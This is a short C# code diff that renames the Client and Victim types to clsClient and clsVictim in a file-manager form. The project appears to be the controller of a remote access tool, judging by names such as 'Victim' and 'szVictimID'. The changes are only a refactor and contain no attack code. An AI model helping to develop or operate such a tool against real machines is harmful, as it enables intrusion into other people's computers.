@@ -22,8 +22,8 @@ namespace Eden
          * Datetime
          */
 
-        public Client m_clnt;
-        public Victim m_victim;
+        public clsClient m_clnt;
+        public clsVictim m_victim;
         public string szVictimID;
 
         private ImageList m_ilFileExt;
@@ -53,7 +53,7 @@ namespace Eden
             public string szMsg;
         }
 
-        public frmFileMgr(Victim victim)
+        public frmFileMgr(clsVictim victim)
         {
             InitializeComponent();
 
@@ -64,7 +64,7 @@ namespace Eden
             m_ilFileExt.ColorDepth = ColorDepth.Depth32Bit;
         }
 
-        void Received(Client clnt, string szVictimID, string[] aMsg)
+        void Received(clsClient clnt, string szVictimID, string[] aMsg)
         {
             try
             {
